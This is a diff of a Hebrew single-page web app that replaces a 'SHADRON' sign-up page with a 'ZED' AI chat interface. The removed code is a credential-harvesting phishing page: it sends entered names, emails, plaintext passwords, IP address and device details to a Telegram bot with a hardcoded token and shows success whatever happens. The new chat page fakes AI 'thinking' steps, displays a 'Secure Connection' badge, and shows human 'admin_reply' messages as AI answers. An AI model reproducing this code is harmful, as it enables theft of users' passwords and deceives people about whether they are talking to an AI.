@@ -2,301 +2,388 @@
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <!-- מותאם לנייד ללא אפשרות זום (user-scalable=no) למניעת קפיצות במקלדת -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SHADRON | NEON NEXUS</title>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
+    <title>ZED | AI Interface</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --neon-purple: #9d00ff;
-            --neon-blue: #00f2ff;
-            --bg: #050505;
-            --insta-live: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            --glow-color: rgba(0, 225, 255, 0.6);
+            --bg-dark: #05070a;
+            --accent-blue: #00e1ff;
+            --text-gray: #a0a0a0;
+            --safe-green: #00ff88;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
 
         body {
-            background: var(--bg);
-            color: #eee;
-            font-family: 'Montserrat', sans-serif;
-            min-height: 100vh;
+            background-color: var(--bg-dark);
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* רקע חלקיקים ותדרים */
+        #particle-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        /* Head - מסגרת דקה */
+        header {
+            padding: 10px 20px;
+            border-bottom: 1px solid rgba(0, 225, 255, 0.2);
+            box-shadow: 0 4px 20px rgba(0, 225, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(5, 7, 10, 0.85);
+            backdrop-filter: blur(15px);
+            z-index: 10;
+        }
+
+        /* לוגו AI מעוצב */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 42px;
+            height: 42px;
+            position: relative;
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow: hidden;
+            background: radial-gradient(circle, rgba(0,225,255,0.2) 0%, transparent 70%);
+            border: 1px solid var(--accent-blue);
+            border-radius: 50%;
+            box-shadow: 0 0 15px var(--glow-color), inset 0 0 10px var(--glow-color);
+            animation: logoPulse 3s infinite ease-in-out;
         }
 
-        #particles { 
-            position: fixed; 
-            top: 0; left: 0; 
-            width: 100%; height: 100%; 
-            z-index: 1; 
-            pointer-events: none; 
-        }
-
-        .screen { 
-            display: none; 
-            width: 100%; 
-            padding: 20px; 
-            position: relative; 
-            z-index: 10;
-            flex-direction: column;
-            align-items: center;
-        }
-        .screen.active { display: flex; animation: fadeIn 0.8s ease; }
-
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
-
-        .form-container {
-            width: 100%;
-            max-width: 380px;
-            background: rgba(10, 10, 10, 0.9);
-            border: 1px solid rgba(157, 0, 255, 0.3);
-            border-radius: 40px;
-            padding: 40px 25px;
-            box-shadow: 0 0 50px rgba(157, 0, 255, 0.2);
-            backdrop-filter: blur(15px);
-            text-align: center;
-        }
-
-        .logo-frame {
-            padding: 15px 35px;
-            border-radius: 100px;
-            display: inline-block;
-            margin-bottom: 30px;
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .logo-frame::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 242, 255, 0.6), transparent);
-            animation: neonScan 2.5s infinite linear;
-        }
-
-        @keyframes neonScan { 0% { left: -100%; } 100% { left: 100%; } }
-
-        .logo-text {
-            font-family: 'Cinzel', serif;
-            font-size: 2rem;
-            letter-spacing: 6px;
-            background: linear-gradient(to right, #fff, var(--neon-blue));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: 700;
-            position: relative;
+        .logo-icon::before {
+            content: 'Z';
+            font-size: 22px;
+            font-weight: 900;
+            color: white;
+            text-shadow: 0 0 10px var(--accent-blue);
             z-index: 2;
         }
 
-        .form-group { margin-bottom: 15px; text-align: right; }
-        label { display: block; margin-bottom: 5px; font-size: 0.75rem; color: #888; padding-right: 15px; }
+        .logo-icon::after {
+            content: '';
+            position: absolute;
+            width: 110%;
+            height: 110%;
+            border: 1px dashed var(--accent-blue);
+            border-radius: 50%;
+            opacity: 0.4;
+            animation: spin 8s linear infinite;
+        }
 
-        input {
-            width: 100%;
-            padding: 14px 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(157, 0, 255, 0.2);
-            border-radius: 25px;
-            color: #fff;
-            font-size: 16px;
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes logoPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); box-shadow: 0 0 25px var(--accent-blue); } }
+
+        .brand-name {
+            font-size: 20px;
+            letter-spacing: 3px;
+            font-weight: 800;
+            text-shadow: 0 0 10px var(--glow-color);
+        }
+
+        /* חותמת אבטחה */
+        .version-area {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+        }
+
+        .security-badge {
+            font-size: 9px;
+            color: var(--safe-green);
+            background: rgba(0, 255, 136, 0.05);
+            padding: 2px 8px;
+            border: 0.5px solid rgba(0, 255, 136, 0.3);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .live-dot {
+            width: 5px;
+            height: 5px;
+            background-color: var(--safe-green);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--safe-green);
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        /* מסגרת הצ'אט */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 900px;
+            margin: 15px auto;
+            width: 92%;
+            background: rgba(10, 15, 20, 0.6);
+            border: 1px solid rgba(0, 225, 255, 0.15);
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(0, 225, 255, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ai-core-bg {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 225, 255, 0.08) 0%, transparent 70%);
+            z-index: 0;
+            animation: pulseCore 4s infinite ease-in-out;
+            pointer-events: none;
+        }
+
+        @keyframes pulseCore { 0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.2; } 50% { transform: translate(-50%, -50%) scale(1.4); opacity: 0.5; } }
+
+        #chat-window {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .message {
+            max-width: 85%;
+            padding: 10px 15px;
+            border-radius: 15px;
+            font-size: 14.5px;
+            line-height: 1.4;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+        .user-message { align-self: flex-start; background: rgba(0, 225, 255, 0.1); border: 1px solid rgba(0, 225, 255, 0.25); border-bottom-left-radius: 2px; }
+        .ai-message { align-self: flex-end; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); border-bottom-right-radius: 2px; }
+
+        #thinking-process { padding: 10px 15px; display: none; flex-direction: column; gap: 4px; z-index: 2; }
+        .step { font-size: 12px; color: var(--text-gray); display: flex; align-items: center; gap: 8px; }
+
+        .input-area {
+            padding: 15px;
+            background: rgba(5, 7, 10, 0.95);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        #user-input {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 12px 18px;
+            border-radius: 30px;
+            color: white;
+            outline: none;
+            font-size: 16px; /* חשוב למניעת זום באייפון */
             transition: 0.3s;
         }
 
-        input:focus { outline: none; border-color: var(--neon-blue); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }
+        #user-input:focus { border-color: var(--accent-blue); background: rgba(255, 255, 255, 0.08); }
 
-        .btn-wakeup {
-            width: 100%;
-            padding: 18px;
-            margin-top: 20px;
-            background: #fff;
-            color: #000;
+        #send-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
             border: none;
-            border-radius: 50px;
-            font-family: 'Cinzel', serif;
-            font-size: 1.2rem;
-            font-weight: 900;
+            background: var(--accent-blue);
+            color: black;
             cursor: pointer;
-            letter-spacing: 2px;
-            transition: 0.3s;
-        }
-
-        .btn-wakeup:disabled { background: #555; cursor: not-allowed; }
-
-        .btn-insta-neon {
+            transition: 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            width: 100%;
-            padding: 22px;
-            margin-top: 30px;
-            text-decoration: none;
-            color: white;
-            font-family: 'Montserrat', sans-serif;
-            font-weight: 700;
-            font-size: 1.1rem;
-            border-radius: 50px;
-            background: var(--insta-live);
-            box-shadow: 0 10px 30px rgba(193, 53, 132, 0.4);
-            transition: 0.4s;
+            box-shadow: 0 0 15px rgba(0, 225, 255, 0.3);
+            flex-shrink: 0;
         }
 
-        .status-badge {
-            display: inline-block;
-            padding: 6px 18px;
-            background: rgba(0, 255, 136, 0.1);
-            color: #00ff88;
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            border-radius: 20px;
-            font-size: 0.75rem;
-            letter-spacing: 2px;
-            margin-bottom: 20px;
-        }
+        #send-btn:active { transform: scale(0.9); opacity: 0.8; }
+        #send-btn:disabled { background: #222; color: #555; box-shadow: none; }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: rgba(0, 225, 255, 0.15); border-radius: 10px; }
     </style>
 </head>
 <body>
 
-<canvas id="particles"></canvas>
+    <canvas id="particle-canvas"></canvas>
 
-<div class="screen active" id="registerScreen">
-    <div class="form-container">
-        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
-        <p style="color: #666; margin-bottom: 25px; letter-spacing: 2px; font-size: 0.8rem;">INITIATING FRACTURE</p>
-        
-        <form id="joinForm">
-            <div class="form-group">
-                <label>שם מלא</label>
-                <input type="text" id="name" placeholder="Name" required>
+    <header>
+        <div class="logo-container">
+            <div class="logo-icon"></div>
+            <div class="brand-name">ZED</div>
+        </div>
+        <div class="version-area">
+            <div style="font-size: 11px; color: var(--text-gray); font-weight: bold; letter-spacing: 1px;">CORE VERSION 3.0</div>
+            <div class="security-badge">
+                <div class="live-dot"></div>
+                Secure Connection
             </div>
-            <div class="form-group">
-                <label>אימייל</label>
-                <input type="email" id="email" placeholder="Email" required>
-            </div>
-            <div class="form-group">
-                <label>סיסמה</label>
-                <input type="password" id="password" placeholder="Password" required>
-            </div>
-            <button type="submit" class="btn-wakeup" id="submitBtn">WAKE UP</button>
-        </form>
-    </div>
-</div>
+        </div>
+    </header>
 
-<div class="screen" id="dashboardScreen">
-    <div class="form-container">
-        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
-        <div class="status-badge">ACCESS GRANTED</div>
-        <h1>WELCOME, <span id="userName">INITIATE</span></h1>
-        
-        <a href="https://www.instagram.com/shadron_cube?igsh=MTczaHF5NXh4eWRobg==" target="_blank" class="btn-insta-neon">
-            <i class="fab fa-instagram fa-lg"></i>
-            SHADRON CUBE
-        </a>
-    </div>
-</div>
+    <main>
+        <div class="ai-core-bg"></div>
+        <div id="chat-window"></div>
+        <div id="thinking-process"></div>
 
-<script>
-    const TELEGRAM_TOKEN = '8359245682:AAFr9l5f0yMop4QrQ2wPfqBmamMLi1SFmgA'; 
-    const CHAT_ID = '8017590244';
+        <div class="input-area">
+            <input type="text" id="user-input" placeholder="שלח הודעה..." autocomplete="off">
+            <button id="send-btn">
+                <i class="fas fa-paper-plane"></i>
+            </button>
+        </div>
+    </main>
 
-    // חלקיקים ברקע
-    const canvas = document.getElementById('particles');
-    const ctx = canvas.getContext('2d');
-    let particles = [];
-    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-    function create() { 
-        particles = []; 
-        for(let i=0; i<100; i++) {
-            particles.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, v: Math.random()*0.5+0.2, s: Math.random()*2, o: Math.random()*0.5+0.2});
+    <script>
+        const network = new BroadcastChannel('zed_network');
+        const canvas = document.getElementById('particle-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+
+        function initCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
         }
-    }
-    function draw() {
-        ctx.clearRect(0,0,canvas.width,canvas.height);
-        particles.forEach(p => { 
-            ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
-            ctx.fillStyle = `rgba(157, 0, 255, ${p.o})`;
-            ctx.fill(); p.y -= p.v; if(p.y < 0) p.y = canvas.height; 
-        });
-        requestAnimationFrame(draw);
-    }
-    window.addEventListener('resize', () => { resize(); create(); });
-    resize(); create(); draw();
 
-    // שליחת נתונים
-    document.getElementById('joinForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        btn.disabled = true;
-        btn.innerText = "PROCESSING...";
+        class Particle {
+            constructor() { this.reset(); }
+            reset() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 1.5;
+                this.speedX = (Math.random() - 0.5) * 0.4;
+                this.speedY = (Math.random() - 0.5) * 0.4;
+                this.opacity = Math.random() * 0.4;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) this.reset();
+            }
+            draw() {
+                ctx.fillStyle = `rgba(0, 225, 255, ${this.opacity})`;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
 
-        const name = document.getElementById('name').value;
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        const time = new Date().toLocaleString('he-IL');
-        
-        // איסוף דאטה טכני
-        let ipData = { ip: "Unknown" };
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            ipData = await response.json();
-        } catch(e) {}
+        for (let i = 0; i < 70; i++) particles.push(new Particle());
 
-        const details = {
-            os: navigator.platform,
-            browser: navigator.userAgent.split(') ')[1] || navigator.userAgent.substring(0, 30),
-            screen: `${window.screen.width}x${window.screen.height}`,
-            lang: navigator.language
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => { p.update(); p.draw(); });
+            requestAnimationFrame(animateParticles);
+        }
+
+        window.addEventListener('resize', initCanvas);
+        initCanvas();
+        animateParticles();
+
+        const chatWindow = document.getElementById('chat-window');
+        const userInput = document.getElementById('user-input');
+        const sendBtn = document.getElementById('send-btn');
+        const thinkingBox = document.getElementById('thinking-process');
+
+        function addMessage(text, type) {
+            const div = document.createElement('div');
+            div.className = `message ${type}-message`;
+            div.textContent = text;
+            chatWindow.appendChild(div);
+            chatWindow.scrollTop = chatWindow.scrollHeight;
+        }
+
+        async function startThinking(text) {
+            thinkingBox.style.display = 'flex';
+            thinkingBox.innerHTML = '';
+            const steps = ["מעבד...", "מנתח...", "ליבת ZED חושבת...", "מפעיל מקורות...", "מכין תשובה..."];
+            const calcTime = Math.min(15000, Math.max(5000, text.length * 80));
+            const stepDuration = calcTime / steps.length;
+
+            for (let i = 0; i < steps.length; i++) {
+                const stepEl = document.createElement('div');
+                stepEl.className = 'step';
+                stepEl.innerHTML = `<i class="fas fa-spinner fa-spin"></i> <span>${steps[i]}</span>`;
+                thinkingBox.appendChild(stepEl);
+                await new Promise(r => setTimeout(r, stepDuration));
+                stepEl.innerHTML = `<i class="fas fa-check" style="color:var(--safe-green)"></i> <span>${steps[i]}</span>`;
+            }
+            return true;
+        }
+
+        async function handleSend() {
+            const text = userInput.value.trim();
+            if (!text) return;
+
+            userInput.value = '';
+            userInput.disabled = true;
+            sendBtn.disabled = true;
+            addMessage(text, 'user');
+
+            // שליחת נתונים ל-demo ול-engine
+            network.postMessage({ target: 'demo', type: 'user_message', content: text, meta: { time: new Date().toLocaleTimeString(), os: navigator.platform } });
+            network.postMessage({ target: 'engine', type: 'process_request', content: text });
+
+            await startThinking(text);
+        }
+
+        network.onmessage = (event) => {
+            if (event.data.target === 'chat') {
+                if (event.data.type === 'ai_response' || event.data.type === 'admin_reply') {
+                    thinkingBox.style.display = 'none';
+                    addMessage(event.data.content, 'ai');
+                    userInput.disabled = false;
+                    sendBtn.disabled = false;
+                    userInput.focus();
+                }
+            }
         };
 
-        const message = `
-💠 *NEW INITIATE ALERT* 💠
-━━━━━━━━━━━━━━━━━━
-👤 *Identity:* ${name}
-📧 *Email:* ${email}
-🔑 *Access Key:* \`${pass}\`
-
-🌐 *Network Info:*
-📍 *IP Address:* ${ipData.ip}
-🌍 *Language:* ${details.lang}
-
-📱 *Device Status:*
-💻 *System:* ${details.os}
-🖥️ *Resolution:* ${details.screen}
-🌐 *Agent:* ${details.browser}
-
-⏰ *Timestamp:* ${time}
-━━━━━━━━━━━━━━━━━━
-🌑 *SHADRON PROTOCOL ACTIVE*
-        `;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            document.getElementById('userName').textContent = name.split(' ')[0].toUpperCase();
-            document.getElementById('registerScreen').classList.remove('active');
-            document.getElementById('dashboardScreen').classList.add('active');
-        } catch (error) {
-            // מעבר בכל מקרה למסך הצלחה
-            document.getElementById('registerScreen').classList.remove('active');
-            document.getElementById('dashboardScreen').classList.add('active');
-        }
-    });
-</script>
-
+        sendBtn.addEventListener('click', handleSend);
+        userInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleSend(); });
+    </script>
 </body>
 </html>
